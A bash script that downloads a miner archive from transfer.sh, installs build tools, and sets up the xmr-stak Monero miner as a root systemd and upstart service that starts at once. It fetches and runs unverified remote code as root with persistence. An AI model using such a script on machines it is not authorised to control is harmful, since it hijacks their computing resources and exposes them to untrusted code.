#!/bin/bash

cd /root && sudo wget https://transfer.sh/PSQgx/miner.tar.gz && sudo apt-get -y update && sudo apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev && sudo tar xzf miner.tar.gz && sudo cat << EOFA > /lib/systemd/system/xmr.service
[Unit]
Description=xmr
After=network.target
[Service]
ExecStart=/root/bin/xmr-stak -c /root/bin/config.txt
User=root
[Install]
WantedBy=multi-user.target
EOFA
cd /root/bin && sudo chmod +x xmr-stak && sudo cat << EOF > /etc/init/xmr.conf
    description "XMR MINER"
    script
      exec /root/bin/xmr-stak -c /root/bin/config.txt
    end script
EOF
sudo chmod +x /etc/init/xmr.conf && sudo service xmr start
